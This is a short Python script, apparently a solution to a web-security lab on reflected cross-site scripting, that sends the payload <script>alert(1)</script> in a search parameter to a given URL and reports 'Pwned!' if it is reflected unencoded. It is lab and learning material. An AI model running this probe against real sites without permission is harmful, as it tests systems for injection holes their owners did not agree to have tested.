#!/usr/bin/env python3
# https://github.com/wvverez
# Reflected XSS into HTML context with nothing encoded

import requests
import sys

if len(sys.argv) != 2:
    print(f"[+] Uso: {sys.argv[0]} <url>")
    sys.exit(1)

url = sys.argv[1]
payload = "<script>alert(1)</script>"
response = requests.get(url + f"?search={payload}")

if payload in response.text:
    print(">>> [+] Pwned!")
else:
    print(">>> [+] Error")
